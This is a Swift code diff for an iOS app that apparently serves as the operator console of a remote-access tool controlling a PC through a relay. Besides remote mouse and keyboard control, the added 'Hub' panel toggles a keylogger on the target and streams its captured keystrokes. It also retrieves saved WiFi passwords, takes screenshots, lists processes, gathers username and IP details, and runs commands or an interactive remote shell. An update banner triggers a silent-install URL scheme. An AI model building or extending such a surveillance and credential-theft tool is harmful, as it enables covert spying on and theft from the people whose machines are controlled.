@@ -44,10 +44,27 @@ final class AppVM: ObservableObject {
     @Published var wrtcActive  = false
     @Published var wrtcStatus  = ""
 
-    // Remote control
-    @Published var rcEnabled   = false
+    // Remote control — virtual cursor position (0…1 normalized)
+    @Published var rcEnabled    = false
     @Published var showKeyboard = false
-    @Published var typedText   = ""
+    @Published var vcX: Double  = 0.5
+    @Published var vcY: Double  = 0.5
+    var rcSensitivity: Double   = 1.0
+
+    // Hub features state
+    @Published var privacyActive   = false
+    @Published var keylogActive    = false
+    @Published var keylogBuffer    = ""
+    @Published var sysInfoText     = ""
+    @Published var shellOutput     = ""
+    @Published var shellRunning    = false
+    @Published var screenshotImage: UIImage? = nil
+    @Published var hubBusy         = false
+    @Published var hubStatusMsg    = ""
+    @Published var showScreenshot  = false
+    @Published var hubShellInput   = ""
+    @Published var wifiPasswords   = ""
+    @Published var processes:      [[String: Any]] = []
 
     // Update
     @Published var updateInfo: ReleaseInfo? = nil
@@ -56,12 +73,12 @@ final class AppVM: ObservableObject {
     @Published var tab: ViewTab = .jpeg
 
     // Internals
-    private var relay:   RelayClient?
+    private(set) var relay: RelayClient?
     private let decoder = H264Decoder()
     private let wrtc    = WebRTCClient()
     private var bag = Set<AnyCancellable>()
 
-    enum ViewTab { case jpeg, fastcap, webrtc }
+    enum ViewTab { case jpeg, fastcap, webrtc, hub }
 
     // MARK: - Connect / Disconnect
 
@@ -108,15 +125,94 @@ final class AppVM: ObservableObject {
             self?.wrtc.handleOffer(sdp: sdp, type: typ)
         }
 
-        // Wire WebRTC signaling → relay. Capture relay strongly via self.relay
-        // at call time (not via `r` which would go weak and could go nil early).
+        // Hub feature callbacks
+        r.onPrivacyResult = { [weak self] active, msg in
+            Task { @MainActor in
+                self?.privacyActive = active
+                self?.hubStatusMsg  = msg
+                self?.hubBusy       = false
+            }
+        }
+
+        r.onScreenshotResult = { [weak self] img in
+            Task { @MainActor in
+                self?.screenshotImage = img
+                self?.showScreenshot  = img != nil
+                self?.hubBusy         = false
+                self?.hubStatusMsg    = img == nil ? "Screenshot failed" : ""
+            }
+        }
+
+        r.onSysInfoResult = { [weak self] d in
+            Task { @MainActor in
+                self?.sysInfoText = Self._formatSysInfo(d)
+                self?.hubBusy     = false
+            }
+        }
+
+        r.onCommandResult = { [weak self] out in
+            Task { @MainActor in
+                self?.shellOutput += out + "\n"
+                self?.hubBusy     = false
+            }
+        }
+
+        r.onKeylogStatus = { [weak self] running, err in
+            Task { @MainActor in
+                self?.keylogActive = running
+                if !err.isEmpty { self?.hubStatusMsg = "Keylog: \(err)" }
+                self?.hubBusy = false
+            }
+        }
+
+        r.onKeyChar = { [weak self] ch in
+            Task { @MainActor in
+                self?.keylogBuffer += ch
+                // Trim to last 2000 chars
+                if let s = self?.keylogBuffer, s.count > 2000 {
+                    self?.keylogBuffer = String(s.suffix(2000))
+                }
+            }
+        }
+
+        r.onShellOutput = { [weak self] data, closed in
+            Task { @MainActor in
+                self?.shellOutput  += data
+                if closed {
+                    self?.shellRunning  = false
+                    self?.shellOutput  += "\n[shell closed]\n"
+                }
+            }
+        }
+
+        r.onWifiPasswords = { [weak self] d in
+            Task { @MainActor in
+                if let nets = d["networks"] as? [[String: Any]] {
+                    self?.wifiPasswords = nets.map { n in
+                        let ssid = n["ssid"] as? String ?? "?"
+                        let pw   = n["password"] as? String ?? "(none)"
+                        return "\(ssid): \(pw)"
+                    }.joined(separator: "\n")
+                } else {
+                    self?.wifiPasswords = d["error"] as? String ?? "(no data)"
+                }
+                self?.hubBusy = false
+            }
+        }
+
+        r.onProcesses = { [weak self] procs in
+            Task { @MainActor in
+                self?.processes = procs
+                self?.hubBusy   = false
+            }
+        }
+
+        // Wire WebRTC signaling → relay
         wrtc.emitSignal = { [weak self] event, extras in
             print("[iOS] wrtc emitSignal: \(event)")
-            guard let self else { print("[iOS] wrtc emitSignal: self is nil"); return }
+            guard let self else { return }
             guard let rc = self.relay else {
-                print("[iOS] wrtc emitSignal: self.relay is nil")
-                self.wrtcStatus = "no relay connection"
-                return
+                self.wrtcStatus = "no relay connection"; return
             }
             switch event {
             case "webrtc_request": rc.webrtcRequest()
@@ -212,15 +308,12 @@ final class AppVM: ObservableObject {
         relay?.scroll(dy: dy)
     }
 
-    func sendTypedText() {
-        let text = typedText
-        guard !text.isEmpty else { return }
-        relay?.typeText(text)
-        typedText = ""
+    func rcTypeChar(_ ch: String) {
+        relay?.typeText(ch)
     }
 
     func sendSpecialKey(_ key: SpecialKey) {
-        relay?.keyPress(key: key.key, code: key.code)
+        relay?.keyPress(key: key.key, code: key.code, ctrl: key.ctrlKey)
     }
 
     enum SpecialKey: String, CaseIterable, Identifiable {
@@ -237,11 +330,11 @@ final class AppVM: ObservableObject {
             case .left:      return "←"
             case .right:     return "→"
             case .win:       return "⊞"
-            case .ctrlC:     return "⌃C"
-            case .ctrlV:     return "⌃V"
-            case .ctrlX:     return "⌃X"
-            case .ctrlA:     return "⌃A"
-            case .ctrlZ:     return "⌃Z"
+            case .ctrlC:     return "^C"
+            case .ctrlV:     return "^V"
+            case .ctrlX:     return "^X"
+            case .ctrlA:     return "^A"
+            case .ctrlZ:     return "^Z"
             }
         }
         var key: String {
@@ -280,6 +373,71 @@ final class AppVM: ObservableObject {
             case .ctrlZ:     return "KeyZ"
             }
         }
+        var ctrlKey: Bool {
+            switch self {
+            case .ctrlC, .ctrlV, .ctrlX, .ctrlA, .ctrlZ: return true
+            default: return false
+            }
+        }
+    }
+
+    // MARK: - Hub feature commands
+
+    func hubPrivacyToggle() {
+        hubBusy = true
+        if privacyActive { relay?.privacyStop() } else { relay?.privacyStart() }
+    }
+
+    func hubScreenshot() {
+        hubBusy = true
+        relay?.takeScreenshot()
+    }
+
+    func hubGetSysInfo() {
+        hubBusy    = true
+        sysInfoText = ""
+        relay?.getSysInfo()
+    }
+
+    func hubShellRun(_ cmd: String) {
+        hubBusy     = true
+        relay?.runCommand(cmd)
+    }
+
+    func hubShellStartInteractive() {
+        shellOutput  = ""
+        shellRunning = true
+        relay?.shellStart()
+    }
+
+    func hubShellSend(_ text: String) {
+        relay?.shellInput(text)
+    }
+
+    func hubShellStopInteractive() {
+        relay?.shellStop()
+        shellRunning = false
+    }
+
+    func hubKeylogToggle() {
+        hubBusy = true
+        if keylogActive { relay?.keylogOff() } else { relay?.keylogOn() }
+    }
+
+    func hubPower(_ action: String) {
+        relay?.powerAction(action)
+    }
+
+    func hubGetWifi() {
+        hubBusy      = true
+        wifiPasswords = ""
+        relay?.getWifiPasswords()
+    }
+
+    func hubGetProcesses() {
+        hubBusy   = true
+        processes = []
+        relay?.getProcesses()
     }
 
     // MARK: - Agent selection
@@ -315,6 +473,21 @@ final class AppVM: ObservableObject {
         relay?.stopFastcap()
         fcFrame  = nil
         fcActive = false
+    }
+
+    // MARK: - Helpers
+
+    private static func _formatSysInfo(_ d: [String: Any]) -> String {
+        var lines: [String] = []
+        let order = ["hostname", "os", "arch", "cpu", "ram_gb", "ram_used_gb",
+                     "disk_gb", "disk_used_gb", "uptime_h", "username", "ip"]
+        for k in order {
+            if let v = d[k] { lines.append("\(k): \(v)") }
+        }
+        for (k, v) in d where !order.contains(k) {
+            lines.append("\(k): \(v)")
+        }
+        return lines.joined(separator: "\n")
     }
 
     // MARK: - Update check
@@ -431,27 +604,42 @@ struct MainViewerView: View {
         ZStack(alignment: .bottom) {
             Color.black.ignoresSafeArea()
 
-            // Video area
+            // Video / hub area
             Group {
                 switch vm.tab {
                 case .jpeg:    JpegViewerPanel(vm: vm)
                 case .fastcap: FastcapViewerPanel(vm: vm)
                 case .webrtc:  WebrtcViewerPanel(vm: vm)
+                case .hub:     HubFeaturesView(vm: vm)
                 }
             }
-            // RC transparent overlay — only captures taps when RC is enabled
-            if vm.rcEnabled {
+
+            // Trackpad overlay — only active on video tabs when RC is enabled
+            if vm.rcEnabled && vm.tab != .hub {
                 GeometryReader { geo in
-                    RCTouchOverlay(vm: vm, size: geo.size)
+                    TrackpadOverlay(vm: vm, viewSize: geo.size)
                 }
                 .ignoresSafeArea()
-                // Status badge top-right
+
+                // Virtual cursor dot
+                GeometryReader { geo in
+                    Circle()
+                        .fill(Color.white.opacity(0.85))
+                        .frame(width: 14, height: 14)
+                        .shadow(color: .black.opacity(0.5), radius: 2)
+                        .position(x: geo.size.width  * vm.vcX,
+                                  y: geo.size.height * vm.vcY)
+                        .allowsHitTesting(false)
+                }
+                .ignoresSafeArea()
+
+                // RC badge
                 VStack {
                     HStack {
                         Spacer()
-                        Text("RC on — tap to click")
+                        Text("RC — drag to move  •  tap to click  •  2-finger tap = right click")
                             .font(.caption2.bold())
-                            .padding(.horizontal, 10).padding(.vertical, 5)
+                            .padding(.horizontal, 8).padding(.vertical, 4)
                             .background(Color.red.opacity(0.85))
                             .foregroundColor(.white)
                             .clipShape(Capsule())
@@ -462,9 +650,9 @@ struct MainViewerView: View {
                 .allowsHitTesting(false)
             }
 
-            // Keyboard bar (above tab bar)
-            if vm.showKeyboard {
-                KeyboardBar(vm: vm)
+            // Dictate keyboard bar (above tab bar)
+            if vm.showKeyboard && vm.tab != .hub {
+                DictateKeyboardBar(vm: vm)
                     .padding(.bottom, 56)
             }
 
@@ -472,28 +660,29 @@ struct MainViewerView: View {
             VStack(spacing: 0) {
                 Divider().overlay(Color.gray.opacity(0.5))
                 HStack(spacing: 0) {
-                    TabButton(label: "JPEG", icon: "photo",
-                              active: vm.tab == .jpeg) { vm.tab = .jpeg }
-                    TabButton(label: "FastCap", icon: "bolt.fill",
-                              active: vm.tab == .fastcap) { vm.tab = .fastcap }
-                    TabButton(label: "WebRTC", icon: "waveform.path.ecg",
-                              active: vm.tab == .webrtc) { vm.tab = .webrtc }
-                    Spacer()
-                    // RC toggle
-                    Button { vm.rcEnabled.toggle() } label: {
-                        Image(systemName: vm.rcEnabled ? "cursorarrow.click.2" : "cursorarrow")
-                            .font(.system(size: 18))
-                            .padding(.horizontal, 10).padding(.vertical, 12)
-                    }
-                    .foregroundColor(vm.rcEnabled ? .red : .gray)
+                    TabButton(label: "JPEG",    icon: "photo",           active: vm.tab == .jpeg)    { vm.tab = .jpeg }
+                    TabButton(label: "FastCap", icon: "bolt.fill",       active: vm.tab == .fastcap) { vm.tab = .fastcap }
+                    TabButton(label: "WebRTC",  icon: "waveform.path.ecg", active: vm.tab == .webrtc)  { vm.tab = .webrtc }
+                    TabButton(label: "Hub",     icon: "gearshape.2.fill", active: vm.tab == .hub)     { vm.tab = .hub }
 
-                    // Keyboard toggle
-                    Button { vm.showKeyboard.toggle() } label: {
-                        Image(systemName: "keyboard")
-                            .font(.system(size: 18))
-                            .padding(.horizontal, 10).padding(.vertical, 12)
+                    Spacer()
+
+                    // RC toggle (hide when in hub tab)
+                    if vm.tab != .hub {
+                        Button { vm.rcEnabled.toggle() } label: {
+                            Image(systemName: vm.rcEnabled ? "cursorarrow.click.2" : "cursorarrow")
+                                .font(.system(size: 18))
+                                .padding(.horizontal, 10).padding(.vertical, 12)
+                        }
+                        .foregroundColor(vm.rcEnabled ? .red : .gray)
+
+                        Button { vm.showKeyboard.toggle() } label: {
+                            Image(systemName: "keyboard")
+                                .font(.system(size: 18))
+                                .padding(.horizontal, 10).padding(.vertical, 12)
+                        }
+                        .foregroundColor(vm.showKeyboard ? .accentColor : .gray)
                     }
-                    .foregroundColor(vm.showKeyboard ? .accentColor : .gray)
 
                     Button { vm.selectedAgent = nil } label: {
                         Image(systemName: "chevron.left")
@@ -505,84 +694,208 @@ struct MainViewerView: View {
             }
         }
         .statusBarHidden(true)
+        .sheet(isPresented: $vm.showScreenshot) {
+            if let img = vm.screenshotImage {
+                VStack {
+                    HStack {
+                        Spacer()
+                        Button("Close") { vm.showScreenshot = false }
+                            .padding()
+                    }
+                    ScrollView([.horizontal, .vertical]) {
+                        Image(uiImage: img)
+                            .resizable()
+                            .scaledToFit()
+                    }
+                }
+                .background(Color.black)
+            }
+        }
     }
 }
 
-// MARK: - RC touch overlay
+// MARK: - Trackpad overlay (relative mouse movement)
 
-struct RCTouchOverlay: View {
+struct TrackpadOverlay: UIViewRepresentable {
     @ObservedObject var vm: AppVM
-    let size: CGSize
+    let viewSize: CGSize
 
-    @State private var isDragging = false
+    func makeUIView(context: Context) -> UIView {
+        let v = UIView()
+        v.backgroundColor = .clear
+        let c = context.coordinator
+        c.hostView = v
 
-    var body: some View {
-        Color.clear
-            .contentShape(Rectangle())
-            .gesture(
-                // Drag → mousemove + mousedown on first, mouseup on end
-                DragGesture(minimumDistance: 4)
-                    .onChanged { v in
-                        let (x, y) = normalize(v.location, in: size)
-                        if !isDragging {
-                            isDragging = true
-                            vm.rcDown(normX: x, normY: y)
-                        }
-                        vm.rcMove(normX: x, normY: y)
-                    }
-                    .onEnded { v in
-                        let (x, y) = normalize(v.location, in: size)
-                        vm.rcUp(normX: x, normY: y)
-                        isDragging = false
-                    }
-            )
-            .onTapGesture { p in
-                let (x, y) = normalize(p, in: size)
-                vm.rcClick(normX: x, normY: y)
-            }
-            .onLongPressGesture(minimumDuration: 0.5) {
-                // Right-click at last-known approximate location
-                // (SwiftUI long-press doesn't give location; use center as fallback)
-                vm.rcRightClick(normX: 0.5, normY: 0.5)
-            }
+        // 1-finger pan → relative cursor movement
+        let pan1 = UIPanGestureRecognizer(target: c, action: #selector(Coordinator.handlePan(_:)))
+        pan1.minimumNumberOfTouches = 1
+        pan1.maximumNumberOfTouches = 1
+        pan1.delegate = c
+        v.addGestureRecognizer(pan1)
+
+        // 2-finger pan → scroll
+        let pan2 = UIPanGestureRecognizer(target: c, action: #selector(Coordinator.handleScroll(_:)))
+        pan2.minimumNumberOfTouches = 2
+        pan2.maximumNumberOfTouches = 2
+        pan2.delegate = c
+        v.addGestureRecognizer(pan2)
+
+        // 1-finger tap → left click at current virtual cursor
+        let tap1 = UITapGestureRecognizer(target: c, action: #selector(Coordinator.handleTap(_:)))
+        tap1.numberOfTouchesRequired = 1
+        tap1.require(toFail: pan1)
+        v.addGestureRecognizer(tap1)
+
+        // 2-finger tap → right click
+        let tap2 = UITapGestureRecognizer(target: c, action: #selector(Coordinator.handleTap2(_:)))
+        tap2.numberOfTouchesRequired = 2
+        tap2.require(toFail: pan2)
+        v.addGestureRecognizer(tap2)
+
+        // Long press → right click (alternative)
+        let lp = UILongPressGestureRecognizer(target: c, action: #selector(Coordinator.handleLongPress(_:)))
+        lp.minimumPressDuration = 0.5
+        lp.numberOfTouchesRequired = 1
+        lp.delegate = c
+        v.addGestureRecognizer(lp)
+
+        // Drag (mousedown → move → mouseup)
+        let drag = UILongPressGestureRecognizer(target: c, action: #selector(Coordinator.handleDrag(_:)))
+        drag.minimumPressDuration = 0.08
+        drag.numberOfTouchesRequired = 1
+        drag.allowableMovement = 500
+        drag.delegate = c
+        v.addGestureRecognizer(drag)
+        c.dragRecognizer = drag
+
+        return v
     }
 
-    private func normalize(_ p: CGPoint, in sz: CGSize) -> (Double, Double) {
-        let x = max(0, min(1, Double(p.x / max(sz.width, 1))))
-        let y = max(0, min(1, Double(p.y / max(sz.height, 1))))
-        return (x, y)
+    func updateUIView(_ v: UIView, context: Context) {}
+
+    func makeCoordinator() -> Coordinator {
+        Coordinator(vm: vm)
+    }
+
+    // MARK: Coordinator
+
+    @MainActor
+    class Coordinator: NSObject, UIGestureRecognizerDelegate {
+        var vm: AppVM
+        weak var hostView: UIView?
+        weak var dragRecognizer: UIGestureRecognizer?
+        private var lastPanTranslation: CGPoint = .zero
+        private var isDragging = false
+
+        init(vm: AppVM) { self.vm = vm }
+
+        func gestureRecognizer(_ g: UIGestureRecognizer,
+                               shouldRecognizeSimultaneouslyWith other: UIGestureRecognizer) -> Bool {
+            // Allow long-press + pan simultaneously for drag
+            return false
+        }
+
+        func gestureRecognizer(_ g: UIGestureRecognizer,
+                               shouldRequireFailureOf other: UIGestureRecognizer) -> Bool {
+            return false
+        }
+
+        @objc func handlePan(_ g: UIPanGestureRecognizer) {
+            guard let v = hostView else { return }
+            let w = Double(v.bounds.width)
+            let h = Double(v.bounds.height)
+            guard w > 0, h > 0 else { return }
+
+            switch g.state {
+            case .began:
+                lastPanTranslation = g.translation(in: v)
+            case .changed:
+                let t  = g.translation(in: v)
+                let dx = Double(t.x - lastPanTranslation.x)
+                let dy = Double(t.y - lastPanTranslation.y)
+                lastPanTranslation = t
+
+                vm.vcX = max(0, min(1, vm.vcX + (dx / w) * vm.rcSensitivity))
+                vm.vcY = max(0, min(1, vm.vcY + (dy / h) * vm.rcSensitivity))
+                vm.rcMove(normX: vm.vcX, normY: vm.vcY)
+            default:
+                break
+            }
+        }
+
+        @objc func handleScroll(_ g: UIPanGestureRecognizer) {
+            guard let v = hostView, g.state == .changed else { return }
+            let vel = g.velocity(in: v)
+            // Normalize scroll: convert px/s to a reasonable scroll step
+            let dy = Double(vel.y) / 3000.0
+            vm.rcScroll(dy: -dy)
+        }
+
+        @objc func handleTap(_ g: UITapGestureRecognizer) {
+            vm.rcClick(normX: vm.vcX, normY: vm.vcY)
+        }
+
+        @objc func handleTap2(_ g: UITapGestureRecognizer) {
+            vm.rcRightClick(normX: vm.vcX, normY: vm.vcY)
+        }
+
+        @objc func handleLongPress(_ g: UILongPressGestureRecognizer) {
+            if g.state == .began {
+                vm.rcRightClick(normX: vm.vcX, normY: vm.vcY)
+            }
+        }
+
+        @objc func handleDrag(_ g: UILongPressGestureRecognizer) {
+            switch g.state {
+            case .began:
+                isDragging = true
+                vm.rcDown(normX: vm.vcX, normY: vm.vcY)
+            case .ended, .cancelled, .failed:
+                if isDragging {
+                    isDragging = false
+                    vm.rcUp(normX: vm.vcX, normY: vm.vcY)
+                }
+            default: break
+            }
+        }
     }
 }
 
-// MARK: - Keyboard bar
+// MARK: - Dictate keyboard bar
 
-struct KeyboardBar: View {
+// Hidden UITextField that sends every keystroke to the PC immediately.
+// No Send button — each character typed goes live.
+
+struct DictateKeyboardBar: View {
     @ObservedObject var vm: AppVM
-
-    private let specialKeys: [AppVM.SpecialKey] = [
-        .esc, .tab, .enter, .backspace, .up, .down, .left, .right,
-        .win, .ctrlC, .ctrlV, .ctrlX, .ctrlA, .ctrlZ
-    ]
+    @State private var dictateRef: DictateFieldHost? = nil
 
     var body: some View {
         VStack(spacing: 6) {
-            // Text input row
-            HStack(spacing: 8) {
-                TextField("Type text to send…", text: $vm.typedText)
-                    .textFieldStyle(.roundedBorder)
-                    .autocapitalization(.none)
-                    .disableAutocorrection(true)
-                    .onSubmit { vm.sendTypedText() }
-                Button("Send") { vm.sendTypedText() }
-                    .buttonStyle(.borderedProminent)
-            }
+            // Tap area — tapping shows the iOS keyboard
+            ZStack {
+                DictateFieldRepresentable(
+                    onChar:       { ch in vm.rcTypeChar(ch) },
+                    onSpecialKey: { k  in vm.sendSpecialKey(k) }
+                )
+                .frame(height: 36)
+                .opacity(0)   // invisible but receives input focus
 
-            // Special keys row (scrollable)
+                Text("⌨ Keyboard live — type to send directly to PC")
+                    .font(.caption)
+                    .foregroundColor(Color.white.opacity(0.6))
+                    .allowsHitTesting(false)
+            }
+            .frame(maxWidth: .infinity, minHeight: 36)
+            .background(Color.gray.opacity(0.25))
+            .clipShape(RoundedRectangle(cornerRadius: 8))
+
+            // Special keys row
             ScrollView(.horizontal, showsIndicators: false) {
                 HStack(spacing: 6) {
-                    ForEach(specialKeys) { k in
+                    ForEach(AppVM.SpecialKey.allCases) { k in
                         Button(k.label) { vm.sendSpecialKey(k) }
-                            .font(.system(size: 13, weight: .medium, design: .monospaced))
+                            .font(.system(size: 14, weight: .medium, design: .monospaced))
                             .padding(.horizontal, 10).padding(.vertical, 6)
                             .background(Color.gray.opacity(0.3))
                             .foregroundColor(.white)
@@ -592,9 +905,80 @@ struct KeyboardBar: View {
             }
         }
         .padding(.horizontal, 10).padding(.vertical, 8)
-        .background(Color.black.opacity(0.85))
+        .background(Color.black.opacity(0.9))
     }
 }
+
+// UITextField wrapper that becomes first responder immediately and sends
+// each keystroke to the PC without buffering.
+struct DictateFieldRepresentable: UIViewRepresentable {
+    var onChar:       (String) -> Void
+    var onSpecialKey: (AppVM.SpecialKey) -> Void
+
+    func makeUIView(context: Context) -> UITextField {
+        let tf = UITextField()
+        tf.delegate = context.coordinator
+        tf.autocorrectionType    = .no
+        tf.autocapitalizationType = .none
+        tf.spellCheckingType     = .no
+        tf.smartQuotesType       = .no
+        tf.smartDashesType       = .no
+        tf.keyboardType          = .default
+        tf.returnKeyType         = .default
+        tf.backgroundColor       = .clear
+        tf.textColor             = .clear
+        tf.tintColor             = .clear
+        tf.text = "X"  // sentinel so backspace is always detectable
+        DispatchQueue.main.async { _ = tf.becomeFirstResponder() }
+        return tf
+    }
+
+    func updateUIView(_ tf: UITextField, context: Context) {
+        // Re-focus if the keyboard was dismissed (e.g. user scrolled away)
+        if !tf.isFirstResponder {
+            DispatchQueue.main.async { _ = tf.becomeFirstResponder() }
+        }
+        // Ensure sentinel is present
+        if tf.text?.isEmpty == true { tf.text = "X" }
+    }
+
+    func makeCoordinator() -> Coordinator { Coordinator(self) }
+
+    final class Coordinator: NSObject, UITextFieldDelegate {
+        let parent: DictateFieldRepresentable
+        init(_ p: DictateFieldRepresentable) { parent = p }
+
+        func textField(_ tf: UITextField,
+                       shouldChangeCharactersIn range: NSRange,
+                       replacementString string: String) -> Bool {
+            if string.isEmpty {
+                // Backspace key
+                parent.onSpecialKey(.backspace)
+            } else {
+                for ch in string {
+                    if ch == "\n" {
+                        parent.onSpecialKey(.enter)
+                    } else {
+                        parent.onChar(String(ch))
+                    }
+                }
+            }
+            // Reset sentinel so backspace always works
+            DispatchQueue.main.async { tf.text = "X" }
+            return false
+        }
+
+        func textFieldShouldReturn(_ tf: UITextField) -> Bool {
+            parent.onSpecialKey(.enter)
+            return false
+        }
+    }
+}
+
+// Helper for DictateFieldRepresentable host reference (unused; kept for future)
+class DictateFieldHost: ObservableObject {}
+
+// MARK: - Tab button
 
 struct TabButton: View {
     let label: String
@@ -609,7 +993,7 @@ struct TabButton: View {
                     .font(.system(size: 16, weight: .medium))
                 Text(label).font(.caption2)
             }
-            .padding(.horizontal, 20)
+            .padding(.horizontal, 16)
             .padding(.vertical, 10)
             .foregroundColor(active ? .accentColor : .gray)
         }
@@ -640,7 +1024,6 @@ struct JpegViewerPanel: View {
                 }
             }
 
-            // Start / Stop overlay
             VStack {
                 Spacer()
                 HStack(spacing: 20) {
@@ -744,9 +1127,7 @@ struct WebrtcVideoView: UIViewRepresentable {
         return v
     }
 
-    func updateUIView(_ v: RTCMTLVideoView, context: Context) {
-        // Track attachment happens in the client; nothing to update here.
-    }
+    func updateUIView(_ v: RTCMTLVideoView, context: Context) {}
 }
 
 struct ActionButton: View {
@@ -793,7 +1174,6 @@ struct UpdateBanner: View {
         .padding(12)
         .background(.thinMaterial)
         .onTapGesture {
-            // Try TrollStore silent install first; fall back to Safari download
             let trollURL = URL(string: "apple-magnifier://install?url=\(info.ipaURL.absoluteString)")!
             if UIApplication.shared.canOpenURL(trollURL) {
                 UIApplication.shared.open(trollURL)
@@ -804,7 +1184,7 @@ struct UpdateBanner: View {
     }
 }
 
-// MARK: - AVSampleBufferDisplayLayer wrapper (reused from original)
+// MARK: - AVSampleBufferDisplayLayer wrapper
 
 struct PixelBufferView: UIViewRepresentable {
     let pixelBuffer: CVPixelBuffer
